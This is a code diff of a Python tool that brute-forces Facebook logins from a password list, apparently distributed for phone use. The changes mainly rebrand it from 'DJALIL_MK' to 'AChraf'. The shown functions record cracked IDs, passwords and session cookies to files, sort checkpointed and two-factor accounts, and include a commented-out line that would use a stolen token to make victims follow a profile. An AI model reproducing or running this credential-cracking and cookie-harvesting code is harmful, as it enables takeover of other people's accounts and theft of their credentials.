@@ -769,26 +769,26 @@ def M_file_44(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print('\r\x1b[1;92m<[AChraf[AChra[> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         coki="sb=shawXD01;"+coki
                                         open('/sdcard/DJALIL_MK_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
-                                        open('/sdcard/DJALIL_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+                                        open('/sdcard/AChraf_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                #print('\r\r\033[1;34m<[DJALIL_MK-2F]> '+ids+' | '+pas)
+                                                #print('\r\r\033[1;34m<[AChraf[AC_MK-> '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                print('\r\x1b[38;5;246m<[AChraf[AC_MK-> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                 open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/AChraf_MK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -845,14 +845,14 @@ def M_file_4(ids, names, passlist):
 				pagevoice = cuser.replace('c_user','m_page_voice')
 				cookie+=pagevoice
 				print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m " + cookie)
-				open('/sdcard/DJALIL_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
+				open('/sdcard/AChraf_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
 				#token = po['access_token']
 				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				    if 'y' in pcp:
-					        print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+					        print('\r\x1b[38;5;246m<[AChraf[AC_MK-> ' + ids + ' | ' + pas + '\x1b[1;97m')
 					        open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					        cps.append(ids)
 					        break
@@ -903,7 +903,7 @@ def approval():
         Trial(sec[1])
     if 'Napv' in sec:
       boos = random.choice([P, M, H, K, B, U, O, N])
-      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}DJALIL_MK+\033[1;32m"+sec.replace('Napv',''))
+      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}AChraf_MK+\033[1;32m"+sec.replace('Napv',''))
       print('\033[1;34m─────────────────────────────────────────────')
       print(' \033[1;32m[\033[1;31m–\033[1;32m] You are not premuim user first buy premuim ')
       print('\033[1;34m-─────────────────────────────────────────────')
